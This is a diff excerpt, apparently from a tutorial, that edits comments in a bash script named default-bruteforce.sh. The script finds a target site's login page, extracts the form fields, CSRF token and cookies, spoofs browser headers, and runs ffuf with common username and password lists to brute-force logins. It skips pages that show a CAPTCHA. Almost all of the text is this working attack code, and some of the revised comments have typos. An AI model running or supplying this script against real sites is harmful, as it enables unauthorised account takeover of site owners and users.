@@ -86,11 +86,11 @@ sudo nano default-bruteforce.sh
 ```bash
 #!/bin/bash
 
-# CONFIG
+# Config
 USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 
-# INPUT CHECK
+# Input Check
 if [ $# -lt 1 ]; then
     echo "Usage: $0 <domain.com>"
     exit 1
@@ -98,7 +98,7 @@ fi
 
 URL="$1"
 
-# FIND LOGIN PAGE
+# Find Login Page
 LOGIN=$(katana -u "$URL" -depth 3 -silent | \
 grep -iE "/(login|signin|sign-in|auth|user/login|admin/login|my-account|account|wp-login\.php)(/)?$" | \
 grep -viE "lost-password|reset|forgot|register|signup|signout|logout|\.(js|css|jpg|png|gif|svg|ico)$" | \
@@ -109,18 +109,18 @@ if [ -z "$LOGIN" ]; then
     exit 1
 fi
 
-# FETCH HTML
+# Fetch HTML
 HTML=$(curl -s "$LOGIN")
 FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)
 
-# CAPTCHA / reCAPTCHA check
+# CAPTCHA / reCAPTCHA Check
 CAPTCHA_KEYWORDS="g-recaptcha|recaptcha|h-captcha|data-sitekey|captcha|grecaptcha.execute|hcaptcha.execute"
 if echo "$HTML" | grep -qiE "$CAPTCHA_KEYWORDS"; then
     echo "[!] CAPTCHA detected on login page. Brute-force aborted."
     exit 1
 fi
 
-# EXTRACT FORM ACTION AND METHOD
+# Extract Form Action and Method
 ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
 [ -z "$ACTION" ] && ACTION="$LOGIN"
 
@@ -137,7 +137,7 @@ else
     FULL_ACTION="${BASE_URL}${ACTION}"
 fi
 
-# EXTRACT USERNAME & PASSWORD FIELDS
+# Extract Username & Password Ffiles
 USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
 grep -Ei 'user(name)?|login(_id)?|userid|uname|mail|email|auth_user' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
 PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | \
@@ -146,7 +146,7 @@ grep -Ei 'pass(word)?|passwd|pwd|auth_pass|login_pass' | head -1 | sed -E 's/.*n
 [ -z "$USERNAME_FIELD" ] && USERNAME_FIELD="username"
 [ -z "$PASSWORD_FIELD" ] && PASSWORD_FIELD="password"
 
-# CSRF TOKEN EXTRACTION
+# CSRF Token Extration
 CSRF_FIELD=""
 CSRF_VALUE=""
 
@@ -166,11 +166,11 @@ if [ -z "$CSRF_FIELD" ] && [ -n "$HIDDEN_INPUTS" ]; then
     CSRF_VALUE=$(echo "$HIDDEN_INPUTS" | grep -oiP 'value=["'\'']?\K[^"'\'' ]+' | head -1)
 fi
 
-# PREPARE POST DATA
+# Prepre POST Data
 DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
 [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ] && DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
 
-# EXTRACT COOKIES
+# Extract Cookies
 COOKIES=$(curl -s -I "$URL" \
   | grep -i '^Set-Cookie:' \
   | sed -E 's/^Set-Cookie: //I' \
@@ -180,7 +180,7 @@ COOKIES=$(curl -s -I "$URL" \
 # Extract only domain and port
 HOST=$(echo "$URL" | sed -E 's~^https?://([^/]+).*~\1~')
 
-# HEADERS
+# Headers
 HEADERS=(
   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0"
   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
@@ -196,7 +196,7 @@ HEADERS=(
   -H "Priority: u=0, i"
 )
 
-# RUN FFUF
+# Run FFUF
 if [[ "$METHOD" == "get" ]]; then
     FFUF_URL="${FULL_ACTION}?${DATA}"
     ffuf -u "$FFUF_URL" \
